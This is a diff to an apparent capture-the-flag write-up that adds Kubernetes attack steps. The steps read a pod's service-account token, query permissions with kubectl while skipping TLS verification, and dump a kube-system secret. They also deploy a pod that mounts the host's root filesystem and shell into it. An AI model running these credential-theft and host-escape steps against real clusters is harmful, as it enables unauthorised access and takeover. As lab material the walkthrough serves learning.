@@ -103,6 +103,7 @@ Right click to inspect the field and..you get the first flag.
 
 ---
 ### Flag 2
+---
 
 Githooks abuse.
 
@@ -137,6 +138,66 @@ By searching for flag files, we get the 2nd flag:
 ![image](https://user-images.githubusercontent.com/86648102/134913989-f240b007-1c98-419f-823e-e2ecfca0c505.png)
 
 
+---
+### Flag 3
+---
+
+As the hint says "kubectl", this one is about Kubernetes (Port 6443)
+
+- Service Account Token
+
+> By default, the containers in the Kubernetes cluster will hold service account token within their file system. If an attacker could find that token, he/she can use it to move laterally or depending the privilege of the service account, one can escalate its privilege to further compromise the cluster environment
+
+`cat /var/run/secrets/kubernetes.io/serviceaccount/token`
+> Output the token to a text file for later usage.
+
+- Usage of it:
+
+`kubectl --token "$(cat token.txt)" --insecure-skip-tls-verify --server=https://$ip:6443 auth can-i --list`
+
+Apparently, we can do anything with it.
+![image](https://user-images.githubusercontent.com/86648102/134915608-1fc9f376-8b15-4615-a423-4d2c2007f73c.png)
+
+As, we have the permissions, let's check the secret resources:
+
+`kubectl --token "$(cat token.txt)" --insecure-skip-tls-verify --server=https://$ip:6443 -n kube-system get secret flag3 -o json | jq -r '.data | map_values(@base64d)'`
+
+
+![image](https://user-images.githubusercontent.com/86648102/134916020-e9f9230e-c70d-4c47-8fa8-65013b5d6ec0.png)
+
+
+---
+### Flag 4
+---
+
+
+We will create a new pod and abuse this.
+Create a **host.yaml**
+
+apiVersion: v1
+kind: Pod
+metadata:
+  name: host
+spec:
+  containers:
+  - image: docker.io/library/nginx@sha256:6d75c99af15565a301e48297fa2d121e15d80ad526f8369c526324f0f7ccb750
+    name: host
+    command: [ "/bin/sh", "-c", "--" ]
+    args: [ "while true; do sleep 30; done;" ]
+    volumeMounts:
+    - mountPath: /host
+      name: host
+  volumes:
+  - name: host
+    hostPath:
+      path: /
+      type: Directory
+
+And then run the following command:
+  
+`kubectl --token "$(cat token.txt)" --insecure-skip-tls-verify --server=https://$ip:6443 -n default apply -f host.yaml`
+  
+`kubectl --token "$(cat token.txt)" --insecure-skip-tls-verify --server=https://$ip:6443 -n default exec -it host bash`
 
 
 
